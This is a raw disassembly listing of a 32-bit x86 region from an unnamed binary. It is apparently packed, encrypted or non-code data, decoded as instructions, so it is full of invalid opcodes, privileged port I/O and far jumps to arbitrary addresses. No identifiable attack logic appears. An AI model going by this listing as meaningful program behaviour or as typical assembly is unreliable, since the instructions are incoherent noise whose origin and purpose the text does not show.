  40ae35:	cs call 0xd0f5:0xf7f7f65
  40ae3d:	and    ebp,esp
  40ae3f:	mov    ds:0xc773b27,eax
  40ae44:	lods   al,BYTE PTR ds:[esi]
  40ae45:	or     eax,0xb8d4fbb8
  40ae4a:	xchg   edx,eax
  40ae4b:	arpl   WORD PTR [edi+0x132f0b96],bx
  40ae51:	adc    eax,ebx
  40ae53:	or     al,0xb
  40ae55:	pop    esp
  40ae56:	or     ch,bh
  40ae58:	dec    ebp
  40ae59:	jbe    0x40aec2
  40ae5b:	arpl   WORD PTR ds:0xf6238fcb,sp
  40ae61:	fst    DWORD PTR [ecx-0x20]
  40ae64:	mov    edx,0xcd716742
  40ae69:	jge    0x40aee0
  40ae6b:	adc    BYTE PTR [ecx],ah
  40ae6d:	inc    ecx
  40ae6e:	sub    BYTE PTR [ebp-0x55],0xab
  40ae72:	popf   
  40ae73:	in     al,0xeb
  40ae75:	cli    
  40ae76:	loopne 0x40ae9f
  40ae78:	into   
  40ae79:	js     0x40aead
  40ae7b:	mov    esi,0x9f478b54
  40ae80:	xchg   esp,eax
  40ae81:	fmul   DWORD PTR [ecx-0xf]
  40ae84:	sti    
  40ae85:	sub    BYTE PTR [eax-0x574ef9b6],0x2d
  40ae8c:	iret   
  40ae8d:	scas   al,BYTE PTR es:[edi]
  40ae8e:	inc    ebp
  40ae8f:	push   esp
  40ae90:	jg     0x40ae9a
  40ae92:	jno    0x40ae3e
  40ae94:	jecxz  0x40ae45
  40ae96:	pop    esi
  40ae97:	sub    al,0x1d
  40ae99:	inc    edx
  40ae9a:	gs push 0xc66e012
  40aea0:	ins    DWORD PTR es:[edi],dx
  40aea1:	mov    ah,0xfc
  40aea3:	(bad)  
  40aea4:	mov    al,0x21
  40aea6:	aaa    
  40aea7:	sub    DWORD PTR ds:0x5b5b822d,ebp
  40aead:	stos   DWORD PTR es:[edi],eax
  40aeae:	jno    0x40ae47
  40aeb0:	pop    ebp
  40aeb1:	sbb    bh,dl
  40aeb3:	jmp    0x8f6eb86b
  40aeb8:	sub    eax,0x1dff2b96
  40aebd:	mov    fs,WORD PTR ds:0x4afb4176
  40aec3:	jl     0x40aeef
  40aec5:	inc    eax
  40aec6:	push   0x93bd348f
  40aecb:	mov    ch,0x43
  40aecd:	add    al,0xd8
  40aecf:	(bad)  
  40aed1:	mov    ah,0x20
  40aed3:	and    esp,ebp
  40aed5:	pop    ecx
  40aed6:	add    bh,BYTE PTR [ecx+0x5b5687ef]
  40aedc:	jecxz  0x40af4c
  40aede:	jne    0x40ae73
  40aee0:	outs   dx,BYTE PTR ds:[esi]
  40aee1:	leave  
  40aee2:	sub    al,0x23
  40aee4:	xchg   ebp,eax
  40aee5:	jle    0x40aea1
  40aee7:	push   0xfffffffd
  40aee9:	mov    eax,ds:0x2548ec30
  40aeee:	dec    ebx
  40aeef:	push   0x75
  40aef1:	mov    al,0x96
  40aef3:	jnp    0x40af47
  40aef5:	lea    ebp,[edx-0x42]
  40aef8:	fwait
  40aef9:	pop    edx
  40aefa:	int    0x98
  40aefc:	and    eax,0xf648a746
  40af01:	fmul   DWORD PTR [edx+0x39]
  40af04:	mov    cl,BYTE PTR [eax+0x4d]
  40af07:	push   0x8bad4bf6
  40af0c:	jge    0x40af36
  40af0e:	leave  
  40af0f:	mov    al,ds:0x4fc41e3e
  40af14:	ins    BYTE PTR es:[edi],dx
  40af15:	cmp    ebx,DWORD PTR [ebp*4+0x9b39f42]
  40af1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af1d:	inc    edi
  40af1e:	ror    DWORD PTR [edi+0x64],1
  40af21:	jg     0x40af23
  40af23:	mov    eax,ds:0xc368ed07
  40af28:	cmp    DWORD PTR es:[eax-0x823cb8f],0xa378fc56
  40af33:	je     0x40aec5
  40af35:	ficom  WORD PTR ds:0x8694b27a
  40af3b:	push   ebx
  40af3c:	out    dx,al
  40af3d:	loopne 0x40af78
  40af3f:	rcr    DWORD PTR [ebx],cl
  40af41:	sbb    DWORD PTR [eax-0x7d],edi
  40af44:	ins    DWORD PTR es:[edi],dx
  40af45:	push   es
  40af46:	mov    ebx,0x8b3b22f9
  40af4b:	icebp  
  40af4c:	ins    BYTE PTR es:[edi],dx
  40af4d:	xchg   ebx,eax
  40af4e:	xchg   BYTE PTR [eax],dh
  40af50:	ret    
  40af51:	inc    ecx
  40af52:	cwde   
  40af53:	ins    DWORD PTR es:[edi],dx
  40af54:	inc    eax
  40af55:	push   ds
  40af56:	jmp    0x40afa8
  40af58:	add    DWORD PTR [edx],edx
  40af5a:	cmp    eax,0xed870062
  40af5f:	xlat   BYTE PTR ds:[ebx]
  40af60:	inc    BYTE PTR [eax]
  40af62:	mov    ds:0xaa8a1813,al
  40af67:	jmp    0x7561297
  40af6c:	inc    esi
  40af6d:	and    ch,BYTE PTR [edi-0x1c2fbde6]
  40af73:	fnsave [eax-0x61]
  40af76:	sti    
  40af77:	cdq    
  40af78:	in     eax,dx
  40af79:	xchg   BYTE PTR ds:0xe823060a,dh
  40af7f:	mov    al,ds:0x5114bd8a
  40af84:	idiv   DWORD PTR [eax]
  40af86:	std    
  40af87:	jge    0x40af7d
  40af89:	into   
  40af8a:	(bad)  
  40af8b:	and    DWORD PTR [esp+edx*4+0x2513f24b],eax
  40af92:	jne    0x40b003
  40af94:	shl    BYTE PTR [esi+0x4399bcad],1
  40af9a:	mov    esi,0xfc7398d8
  40af9f:	mov    ch,0x2d
  40afa1:	push   ds
  40afa2:	test   DWORD PTR [esi-0x67c25820],edi
  40afa8:	mov    eax,ds:0xae6806ff
  40afad:	popf   
  40afae:	scas   al,BYTE PTR es:[edi]
  40afaf:	cld    
  40afb0:	mov    dh,0xa4
  40afb2:	scas   eax,DWORD PTR es:[edi]
  40afb3:	aas    
  40afb4:	inc    esi
  40afb5:	ds js  0x40b01c
  40afb8:	cmp    ch,bl
  40afba:	mov    ebx,0x311d999f
  40afbf:	imul   DWORD PTR [esi-0x70c851f3]
  40afc5:	inc    esp
  40afc6:	ds mov eax,0xa7591021
  40afcc:	push   esp
  40afcd:	sub    ch,BYTE PTR [edi-0x597daa65]
  40afd3:	test   al,0x4c
  40afd5:	jp     0x40b018
  40afd7:	int    0x9f
  40afd9:	mov    ecx,0xa8e7af5a
  40afde:	xlat   BYTE PTR ds:[ebx]
  40afdf:	aas    
  40afe0:	push   ebp
  40afe1:	stos   BYTE PTR es:[edi],al
  40afe2:	in     al,0xc2
  40afe4:	ror    DWORD PTR [eax],1
  40afe6:	rol    ecx,cl
  40afe8:	mov    cl,0x17
  40afea:	push   ebx
  40afeb:	std    
  40afec:	push   0x29
  40afee:	inc    esi
  40afef:	sbb    edi,DWORD PTR [ebp-0x31]
  40aff2:	or     dh,BYTE PTR ds:0xb66c1dc0
  40aff8:	pop    ds
  40aff9:	pop    eax
  40affa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40affb:	dec    ecx
  40affc:	imul   ebx,DWORD PTR [ecx],0xca0e4521
  40b002:	mov    eax,0xa0142a99
  40b007:	sbb    edx,DWORD PTR [ebx+ebx*1-0x3d3f8f06]
  40b00e:	pusha  
  40b00f:	xchg   ebx,eax
  40b010:	pop    ebx
  40b011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b012:	sbb    al,0xc
  40b014:	in     eax,dx
  40b015:	aam    0x4d
  40b017:	(bad)  
  40b019:	mov    eax,ds:0xfe8c260b
  40b01e:	out    dx,al
  40b01f:	xchg   edi,eax
  40b020:	push   0x1c
  40b022:	cli    
  40b023:	lock and ch,BYTE PTR [esi+0x49]
  40b027:	jle    0x40b033
  40b029:	add    al,0xc
  40b02b:	mov    bl,0x5d
  40b02d:	nop
  40b02e:	jns    0x40b091
  40b030:	(bad)  [edi-0x4f]
  40b033:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b034:	mov    bl,0x92
  40b036:	ss inc ecx
  40b038:	retf   
  40b039:	mov    eax,ds:0xc3440fed
  40b03e:	outs   dx,BYTE PTR ds:[esi]
  40b03f:	mov    al,0x63
  40b041:	push   ss
  40b042:	mov    edx,0x1b7b43ae
  40b047:	jmp    0x6323:0xfd33c0b0
  40b04e:	popa   
  40b04f:	leave  
  40b050:	arpl   ax,cx
  40b052:	push   eax
  40b053:	xchg   ebp,eax
  40b054:	rol    DWORD PTR ds:0x1f03d9e0,cl
  40b05a:	out    0x95,eax
  40b05c:	pop    ss
  40b05d:	aam    0xf8
  40b05f:	push   ss
  40b060:	dec    edx
  40b061:	cmc    
  40b062:	push   es
  40b063:	call   0x4e95:0x465e16c9
  40b06a:	in     al,0xfd
  40b06c:	test   ebp,esi
  40b06e:	call   0xa039f61a
  40b073:	icebp  
  40b074:	fidiv  WORD PTR [edi*8-0x67cf7be7]
  40b07b:	or     al,0x93
  40b07d:	in     eax,0x6b
  40b07f:	and    eax,DWORD PTR [edi+0x158ee3e4]
  40b085:	sub    eax,0x3c05bef8
  40b08a:	data16 aad 0x1f
  40b08d:	loopne 0x40b065
  40b08f:	je     0x40b0c4
  40b091:	cli    
  40b092:	fiadd  DWORD PTR [ebx]
  40b094:	cmp    BYTE PTR [edx],ah
  40b096:	pusha  
  40b097:	sub    DWORD PTR [edx+0x1a],0xffffff82
  40b09b:	jmp    0x40b02a
  40b09d:	daa    
  40b09e:	add    eax,DWORD PTR ds:0x96547203
  40b0a4:	imul   ebx,ebp,0x23
  40b0a7:	sub    ebx,DWORD PTR [edi]
  40b0a9:	dec    ecx
  40b0aa:	popa   
  40b0ab:	add    al,0xa9
  40b0ad:	lds    ebx,FWORD PTR [ecx+0x73f5c1ac]
  40b0b3:	mov    ah,0xbb
  40b0b5:	repnz cs in eax,0x2
  40b0b9:	xchg   edi,eax
  40b0ba:	mov    dh,0x34
  40b0bc:	jb     0x40b0af
  40b0be:	je     0x40b0ae
  40b0c0:	out    0xb3,eax
  40b0c2:	or     ch,BYTE PTR [ebx+0x1fcd0729]
  40b0c8:	jg     0x40b0e7
  40b0ca:	xlat   BYTE PTR ds:[ebx]
  40b0cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0cc:	push   eax
  40b0cd:	and    ecx,DWORD PTR [esi]
  40b0cf:	push   ss
  40b0d0:	aam    0xc6
  40b0d2:	and    DWORD PTR [esi],edi
  40b0d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0d5:	popa   
  40b0d6:	and    eax,0xbd4ea971
  40b0db:	mov    cl,0x4d
  40b0dd:	adc    ebx,DWORD PTR [esi-0x2623ad53]
  40b0e3:	push   cs
  40b0e4:	or     al,0x37
  40b0e6:	pop    ecx
  40b0e7:	inc    esp
  40b0e8:	jae    0x40b0c1
  40b0ea:	pop    ecx
  40b0eb:	dec    eax
  40b0ec:	imul   ecx
  40b0ee:	sbb    BYTE PTR [edi+0x6d],ch
  40b0f1:	mov    ch,0xb4
  40b0f3:	mov    ebp,0xfe3ba0
  40b0f8:	jns    0x40b0b5
  40b0fa:	mov    al,0x1e
  40b0fc:	pop    ebx
  40b0fd:	inc    edx
  40b0fe:	je     0x40b0e9
  40b100:	add    BYTE PTR [esi+0x4dc39810],al
  40b106:	neg    cl
  40b108:	fcmovnb st,st(3)
  40b10a:	jecxz  0x40b0fd
  40b10c:	outs   dx,BYTE PTR ds:[esi]
  40b10d:	add    DWORD PTR [eax+0x27a1fd92],esi
  40b113:	bound  ebp,QWORD PTR [ecx-0x74]
  40b116:	aad    0x78
  40b118:	push   edx
  40b119:	in     eax,0xf8
  40b11b:	pop    esp
  40b11c:	cs inc esp
  40b11e:	xchg   ecx,eax
  40b11f:	imul   edi,DWORD PTR [ecx+0x59],0x3455c80d
  40b126:	rol    ah,1
  40b128:	pop    edx
  40b129:	add    ch,ch
  40b12b:	cmp    dh,BYTE PTR [ebx+0x48dd54ec]
  40b131:	mov    bl,0x16
  40b133:	inc    esi
  40b134:	dec    edx
  40b135:	sbb    DWORD PTR [eax+0x2bbf0858],ebx
  40b13b:	add    BYTE PTR [edi-0xf1bfc51],ch
  40b141:	cmp    al,bh
  40b143:	ret    
  40b144:	jg     0x40b130
  40b146:	or     DWORD PTR [ebx-0xb6c4b50],esp
  40b14c:	dec    ecx
  40b14d:	xchg   edi,eax
  40b14e:	fild   WORD PTR [edx]
  40b150:	or     al,0xbb
  40b152:	mov    ah,0xe
  40b154:	jb     0x40b19e
  40b156:	out    dx,al
  40b157:	mov    esi,0x9afb1a8a
  40b15c:	fmul   st(0),st
  40b15e:	add    eax,0xce118c03
  40b163:	aam    0x30
  40b165:	ss cs fcomp st(6)
  40b169:	mov    bh,0xc7
  40b16b:	cs mov ah,0x16
  40b16e:	fdivr  QWORD PTR [esp+esi*8+0x2d]
  40b172:	pop    esi
  40b173:	inc    esi
  40b174:	out    dx,al
  40b175:	test   al,0xa8
  40b177:	in     eax,0x22
  40b179:	mov    ecx,0xf1f572c9
  40b17e:	jns    0x40b10f
  40b180:	and    ch,BYTE PTR [esi-0x366a693]
  40b186:	or     eax,0x294be5d0
  40b18b:	push   cs
  40b18c:	cmp    DWORD PTR ds:0x3e36a3f9,0xf02d7f7c
  40b196:	popf   
  40b197:	pop    ecx
  40b198:	iret   
  40b199:	mov    eax,ds:0xba509ed
  40b19e:	dec    eax
  40b19f:	loop   0x40b139
  40b1a1:	inc    edx
  40b1a2:	lock test eax,0x2f13cef4
  40b1a8:	adc    ah,ch
  40b1aa:	jb     0x40b143
  40b1ac:	sub    BYTE PTR [ecx-0x38],dh
  40b1af:	mov    esi,0x3aa2ebbd
  40b1b4:	lods   eax,DWORD PTR ds:[esi]
  40b1b5:	jl     0x40b15a
  40b1b7:	repz into 
  40b1b9:	fiadd  WORD PTR [edx-0x3]
  40b1bc:	dec    eax
  40b1bd:	repz jle 0x40b147
  40b1c0:	mov    dl,0xc4
  40b1c2:	clc    
  40b1c3:	hlt    
  40b1c4:	push   edi
  40b1c5:	cwde   
  40b1c6:	loop   0x40b230
  40b1c8:	inc    ebp
  40b1c9:	sub    al,BYTE PTR [ebp-0x10]
  40b1cc:	inc    ebp
  40b1cd:	mov    eax,0xbe68ba4d
  40b1d2:	imul   ebp,DWORD PTR [esi+0x18],0xffffffaa
  40b1d6:	pop    DWORD PTR [ebp-0x63]
  40b1d9:	je     0x40b1aa
  40b1db:	fisub  WORD PTR [ebx+0x9e9ac16]
  40b1e1:	clc    
  40b1e2:	scas   al,BYTE PTR es:[edi]
  40b1e3:	out    0x2f,al
  40b1e5:	mov    ds:0xaaf5d6dd,al
  40b1ea:	pop    esp
  40b1eb:	add    al,0xca
  40b1ed:	sub    ebx,DWORD PTR [ebx-0xc]
  40b1f0:	fs dec esi
  40b1f2:	rol    DWORD PTR [ecx-0x47],1
  40b1f5:	lods   al,BYTE PTR ds:[esi]
  40b1f6:	add    al,0x45
  40b1f8:	cmp    DWORD PTR [ebx-0x41400f7a],ebp
  40b1fe:	mov    edi,0x983d7970
  40b203:	mov    cl,BYTE PTR [ecx+0x0]
  40b206:	or     ebp,DWORD PTR [ebx+0x63989ecb]
  40b20c:	sub    dh,0x35
  40b20f:	stos   BYTE PTR es:[edi],al
  40b210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b211:	jecxz  0x40b1fd
  40b213:	mov    ah,0xfb
  40b215:	mov    eax,ds:0x6a7697b6
  40b21a:	mov    ds:0xeb40a2c9,eax
  40b21f:	jno    0x40b1ce
  40b221:	xor    DWORD PTR [esi+0x53d6a84c],edi
  40b227:	sub    ebx,ecx
  40b229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b22a:	push   edi
  40b22b:	xchg   DWORD PTR [ecx],ebp
  40b22d:	xor    eax,0x8acaffca
  40b232:	mov    al,ss:0xb246c629
  40b238:	add    BYTE PTR [edi+0x7e0c0d90],0xa3
  40b23f:	jl     0x40b1f0
  40b241:	stos   BYTE PTR es:[edi],al
  40b242:	mov    esp,0xdfb9b64b
  40b247:	sub    eax,0x279538a3
  40b24c:	fs push es
  40b24e:	sub    DWORD PTR [ecx+0x12],edi
  40b251:	inc    edx
  40b252:	inc    esp
  40b253:	dec    esp
  40b254:	push   edi
  40b255:	dec    edi
  40b256:	test   bl,ah
  40b258:	jecxz  0x40b2a2
  40b25a:	mul    esp
  40b25c:	mov    eax,0xaf41981
  40b261:	or     al,0x0
  40b263:	loopne 0x40b227
  40b265:	jbe    0x40b2d5
  40b267:	sti    
  40b268:	push   cs
  40b269:	mov    eax,ds:0xcf0d5289
  40b26e:	nop
  40b26f:	jb     0x40b236
  40b271:	pop    edx
  40b272:	mov    ebx,0xb234ec23
  40b277:	mov    edi,0x4170c729
  40b27c:	and    esi,eax
  40b27e:	fs mov ecx,0xf05d6621
  40b284:	cwde   
  40b285:	shl    DWORD PTR [eax+0x5e2a6fab],1
  40b28b:	cwde   
  40b28c:	xchg   BYTE PTR [eax+0xd],ah
  40b28f:	pop    ds
  40b290:	fiadd  DWORD PTR [ebx+0x7cdf4a3a]
  40b296:	dec    ebx
  40b297:	and    eax,0xa42b06b9
  40b29c:	test   BYTE PTR [edi],bl
  40b29e:	cmp    al,0x30
  40b2a0:	lods   al,BYTE PTR ds:[esi]
  40b2a1:	sbb    bh,BYTE PTR [ebp-0x52]
  40b2a4:	lahf   
  40b2a5:	shl    al,1
  40b2a7:	mov    ds:0x8e881c4a,eax
  40b2ac:	inc    ebx
  40b2ad:	sbb    al,0xec
  40b2af:	pop    ds
  40b2b0:	pop    ebx
  40b2b1:	mov    dh,0x87
  40b2b3:	mov    esi,0x265de878
  40b2b8:	inc    esi
  40b2b9:	out    dx,eax
  40b2ba:	outs   dx,DWORD PTR ds:[esi]
  40b2bb:	ins    BYTE PTR es:[edi],dx
  40b2bc:	psubusb mm0,QWORD PTR [eax-0xa]
  40b2c0:	loope  0x40b296
  40b2c2:	pusha  
  40b2c3:	push   cs
  40b2c4:	inc    ecx
  40b2c5:	pop    esi
  40b2c6:	sub    eax,0xd00be04e
  40b2cb:	sbb    esp,eax
  40b2cd:	and    ebx,DWORD PTR [ebp-0x1457438f]
  40b2d3:	jae    0x40b2fc
  40b2d5:	dec    esp
  40b2d6:	(bad)
  40b2d9:	stos   DWORD PTR es:[edi],eax
  40b2da:	popf   
  40b2db:	int3   
  40b2dc:	(bad)  
  40b2dd:	adc    edi,DWORD PTR [ecx+0x7c6ed9ab]
  40b2e3:	pop    edi
  40b2e4:	aas    
  40b2e5:	ss pop eax
  40b2e7:	mov    ebp,0xb8fbd5e3
  40b2ec:	jae    0x40b2b1
  40b2ee:	outs   dx,BYTE PTR ds:[esi]
  40b2ef:	dec    ebp
  40b2f0:	mov    edx,0x42046f52
  40b2f5:	daa    
  40b2f6:	inc    eax
  40b2f7:	daa    
  40b2f8:	shr    DWORD PTR [ebx+0x3f],cl
  40b2fb:	jecxz  0x40b30b
  40b2fd:	scas   eax,DWORD PTR es:[edi]
  40b2fe:	stc    
  40b2ff:	fcomi  st,st(0)
  40b301:	mov    edx,0x707b1221
  40b306:	push   ebp
  40b307:	scas   eax,DWORD PTR es:[edi]
  40b308:	out    0x2d,al
  40b30a:	les    ecx,FWORD PTR [bx+di+0x4536]
  40b30f:	div    BYTE PTR [ebp+0x76]
  40b312:	lahf   
  40b313:	test   ah,ah
  40b315:	inc    eax
  40b316:	pop    ecx
  40b317:	sub    DWORD PTR [ebp+0x1b127c26],ecx
  40b31d:	cmp    cl,ah
  40b31f:	pop    ds
  40b320:	push   edi
  40b321:	out    0xfe,al
  40b323:	std    
  40b324:	mov    bh,0xe4
  40b326:	pop    ss
  40b327:	jo     0x40b2c7
  40b329:	jb     0x40b352
  40b32b:	and    eax,edx
  40b32d:	test   al,0x70
  40b32f:	push   ecx
  40b330:	jnp    0x40b2fe
  40b332:	shr    BYTE PTR [edi-0x6d],1
  40b335:	add    BYTE PTR [esi+0xbd52cf],bl
  40b33b:	sub    eax,0x6b438dea
  40b340:	sub    eax,0xa1bc3bb7
  40b345:	enter  0xa386,0x48
  40b349:	gs mov ebx,0x19b69314
  40b34f:	into   
  40b350:	int3   
  40b351:	cdq    
  40b352:	sti    
  40b353:	jo     0x40b31d
  40b355:	pop    ecx
  40b356:	repnz or al,0xa3
  40b359:	neg    DWORD PTR [edx-0x2a]
  40b35c:	iret   
  40b35d:	aam    0xe6
  40b35f:	mov    esp,0x48fd2cf2
  40b364:	aad    0x2d
  40b366:	mov    eax,ds:0xcb489e41
  40b36b:	in     eax,dx
  40b36c:	call   0xd19d:0x4f4ddb5f
  40b373:	jg     0x40b382
  40b375:	xor    DWORD PTR [ecx+ecx*8+0x20],edx
  40b379:	loop   0x40b307
  40b37b:	or     bl,BYTE PTR ds:0x11ad04e8
  40b381:	jl     0x40b3c0
  40b383:	sub    eax,0xda7435fd
  40b388:	mov    ds:0x718feaeb,eax
  40b38d:	(bad)  
  40b38e:	mov    esp,0x5d0937ce
  40b393:	sbb    al,0xd5
  40b395:	jmp    0x8623:0x6c715269
  40b39c:	mov    al,ds:0x4a2f0ef7
  40b3a1:	pop    ebp
  40b3a2:	fwait
  40b3a3:	or     al,0x8
  40b3a5:	rcl    DWORD PTR [ebx],1
  40b3a7:	mov    bh,0xf2
  40b3a9:	jp     0x40b3b9
  40b3ab:	sbb    esi,DWORD PTR [ebx+0x2cddbd2b]
  40b3b1:	inc    edx
  40b3b2:	icebp  
  40b3b3:	cs cmp al,cl
  40b3b6:	rol    DWORD PTR [ebx-0x58],1
  40b3b9:	call   0x10ba:0x936657ae
  40b3c0:	and    eax,0xf92243d6
  40b3c5:	iret   
  40b3c6:	cdq    
  40b3c7:	iret   
  40b3c8:	into   
  40b3c9:	in     al,0x80
  40b3cb:	push   esi
  40b3cc:	inc    ebx
  40b3cd:	xchg   edx,eax
  40b3ce:	jmp    0x40b3d6
  40b3d0:	mov    ds:0xc6769af0,eax
  40b3d5:	sub    bh,dl
  40b3d7:	retf   
  40b3d8:	xor    cl,BYTE PTR [esi-0x6c50f650]
  40b3de:	and    BYTE PTR [edi],bh
  40b3e0:	inc    ecx
  40b3e1:	ja     0x40b436
  40b3e3:	mov    ds:0x984c8562,eax
  40b3e8:	stc    
  40b3e9:	xchg   ebx,eax
  40b3ea:	stc    
  40b3eb:	adc    cl,BYTE PTR [esp+eax*8-0x688a9721]
  40b3f2:	jne    0x40b390
  40b3f4:	add    edi,esi
  40b3f6:	and    esi,DWORD PTR [edi+ecx*8-0x462594b1]
  40b3fd:	push   esi
  40b3fe:	mov    edx,0xf11caaf1
  40b403:	and    eax,0xd997ecf
  40b408:	push   esi
  40b409:	xchg   ecx,eax
  40b40a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b40b:	sub    al,BYTE PTR [ebx]
  40b40d:	pmaxub mm1,QWORD PTR [edx-0x65b16d72]
  40b414:	xor    BYTE PTR ds:0x7c343e02,ah
  40b41a:	lods   eax,DWORD PTR ds:[esi]
  40b41b:	mov    dl,0xf
  40b41d:	mov    WORD PTR [edx],?
  40b41f:	icebp  
  40b420:	pop    esi
  40b421:	bound  ecx,QWORD PTR [edi+0x50]
  40b424:	cmp    eax,0xc7628e2a
  40b429:	outs   dx,DWORD PTR ds:[esi]
  40b42a:	outs   dx,DWORD PTR ds:[esi]
  40b42b:	mov    ebx,0x6388682c
  40b430:	xchg   esi,eax
  40b431:	fiadd  WORD PTR [edx-0x6acaa37a]
  40b437:	dec    edi
  40b438:	mov    esp,0x5a9e53f5
  40b43d:	shl    DWORD PTR [edx+ecx*8],1
  40b440:	retf   0xc54c
  40b443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b444:	bound  ebx,QWORD PTR [ecx+ebp*2]
  40b447:	dec    esp
  40b448:	jns    0x40b408
  40b44a:	aas    
  40b44b:	outs   dx,BYTE PTR ds:[esi]
  40b44c:	jne    0x40b44b
  40b44e:	adc    DWORD PTR [edx],ebp
  40b450:	jmp    0xa7a35211
  40b455:	jmp    0x40b3e6
  40b457:	xor    DWORD PTR ds:0x949b7ec,0xffffffb4
  40b45e:	js     0x40b48b
  40b460:	test   eax,0x8ed67828
  40b465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b466:	leave  
  40b467:	hlt    
  40b468:	outs   dx,DWORD PTR ds:[esi]
  40b469:	jne    0x40b432
  40b46b:	jae    0x40b45f
  40b46d:	mov    esi,0xb5d0c7e3
  40b472:	mov    dl,0x1f
  40b474:	xchg   edx,eax
  40b475:	xchg   esi,eax
  40b476:	ret    
  40b477:	add    DWORD PTR [eax-0x2b],ebx
  40b47a:	and    cl,bl
  40b47c:	dec    esp
  40b47d:	jg     0x40b480
  40b47f:	adc    al,0x9
  40b481:	ror    DWORD PTR [ebx+0x332d766],1
  40b487:	stos   BYTE PTR es:[edi],al
  40b488:	lfs    ebp,FWORD PTR fs:[eax]
  40b48c:	scas   eax,DWORD PTR es:[edi]
  40b48d:	cdq    
  40b48e:	int    0x25
  40b490:	and    edx,DWORD PTR [edx+0x97a588]
	...
  40b512:	add    BYTE PTR [eax],al
  40b514:	out    0x10,eax
  40b516:	jge    0x40b4f1
  40b518:	(bad)  
  40b519:	std    
  40b51a:	out    0x3e,eax
  40b51c:	lods   eax,DWORD PTR ds:[esi]
  40b51d:	add    dh,ah
  40b51f:	rcr    edi,cl
  40b521:	cwde   
  40b522:	push   ebp
  40b523:	and    BYTE PTR [ecx],0x66
  40b526:	add    BYTE PTR [eax],al
  40b528:	imul   eax,DWORD PTR [edi],0xcdba0000
  40b52e:	xchg   esp,eax
  40b52f:	(bad)
  40b532:	imul   esi,DWORD PTR [edi],0xab05bb46
  40b538:	sub    dl,al
  40b53a:	dec    eax
  40b53b:	inc    ebx
  40b53c:	mov    ds:0xfd9dddcd,al
  40b541:	jle    0x40b558
  40b543:	or     DWORD PTR [ecx+ebp*4-0x5c],0x3e
  40b548:	popa   
  40b549:	(bad)  
  40b54a:	dec    ecx
  40b54b:	idiv   BYTE PTR [ebx]
  40b54d:	mov    dl,BYTE PTR [ebp-0x38]
  40b550:	pop    es
  40b551:	jl     0x40b5c6
  40b553:	arpl   WORD PTR [ebx-0x43f100cc],sp
  40b559:	sbb    esi,edi
  40b55b:	jmp    0xc1da:0xe9c07c70
  40b562:	loopne 0x40b4f7
  40b564:	push   edi
  40b565:	cmp    eax,0x3b497327
  40b56a:	mov    bh,0xcd
  40b56c:	push   0x25f0ec2f
  40b571:	or     al,0xad
  40b573:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b574:	pop    edi
  40b575:	push   es
  40b576:	mov    bl,0x22
  40b578:	xchg   esp,eax
  40b579:	push   esi
  40b57a:	ffree  st(4)
  40b57c:	popa   
  40b57d:	(bad)  [ecx-0x1d927641]
  40b583:	les    ebx,FWORD PTR [eax+eax*1-0x2f]
  40b587:	shl    DWORD PTR [ecx+0x4a],1
  40b58a:	add    BYTE PTR [ecx],bh
  40b58c:	add    ch,BYTE PTR [ecx+0x3c]
  40b58f:	fsubr  st(1),st
  40b591:	pop    esi
  40b592:	stos   DWORD PTR es:[edi],eax
  40b593:	popa   
  40b594:	xor    ebp,DWORD PTR [eax]
  40b596:	jp     0x40b5ed
  40b598:	ret    
  40b599:	sub    ebx,DWORD PTR [ebp+0x1607596b]
  40b59f:	mov    DWORD PTR [edx+0x65],eax
  40b5a2:	cmp    bl,BYTE PTR [ebp-0x59]
  40b5a5:	mov    esi,?
  40b5a7:	jo     0x40b590
  40b5a9:	popf   
  40b5aa:	jle    0x40b54d
  40b5ac:	mov    bl,bl
  40b5ae:	clc    
  40b5af:	es ds leave 
  40b5b2:	ins    BYTE PTR es:[edi],dx
  40b5b3:	inc    eax
  40b5b4:	call   0x557d:0xe8c687bb
  40b5bb:	jle    0x40b596
  40b5bd:	pop    ebp
  40b5be:	push   ebx
  40b5bf:	popf   
  40b5c0:	mov    al,0x3a
  40b5c2:	mov    cl,0x4b
  40b5c4:	add    eax,0xae6496d4
  40b5c9:	mov    ebx,0x8ad26450
  40b5ce:	int3   
  40b5cf:	xchg   edx,eax
  40b5d0:	dec    esp
  40b5d1:	adc    eax,0xf3069710
  40b5d6:	aas    
  40b5d7:	in     al,0x7e
  40b5d9:	xchg   esp,eax
  40b5da:	pop    ss
  40b5db:	and    eax,0xfffffff0
  40b5de:	sbb    edi,DWORD PTR [edx+0x4d68b518]
  40b5e4:	clc    
  40b5e5:	xchg   DWORD PTR [edx-0x46309b16],eax
  40b5eb:	mov    bl,0xc6
  40b5ed:	jmp    0x900cf22d
  40b5f2:	pop    edi
  40b5f3:	leave  
  40b5f4:	neg    DWORD PTR [ebx-0xa]
  40b5f7:	into   
  40b5f8:	mov    DWORD PTR [ebx],esp
  40b5fa:	outs   dx,DWORD PTR ds:[esi]
  40b5fb:	jne    0x40b66c
  40b5fd:	outs   dx,DWORD PTR ds:[esi]
  40b5fe:	mov    al,ds:0xf364b192
  40b603:	push   ecx
  40b604:	int3   
  40b605:	xchg   ecx,eax
  40b606:	rol    BYTE PTR [edi-0x66],0xa
  40b60a:	nop
  40b60b:	mov    dh,BYTE PTR [ebx-0x13]
  40b60e:	call   0xfb:0x921412ee
  40b615:	(bad)  
  40b616:	or     al,0x5a
  40b618:	in     eax,0x13
  40b61a:	mov    DWORD PTR [edi],edi
  40b61c:	test   eax,0xc31a417e
  40b621:	jle    0x40b63f
  40b623:	shl    DWORD PTR [ebx+0x4dbff16c],1
  40b629:	cmp    ecx,esi
  40b62b:	addr16 out dx,al
  40b62d:	ss inc edi
  40b62f:	dec    edi
  40b630:	sbb    BYTE PTR [ebp+0x56dcd989],dh
  40b636:	outs   dx,BYTE PTR ds:[esi]
  40b637:	imul   ebp,DWORD PTR [edi],0xdffdb991
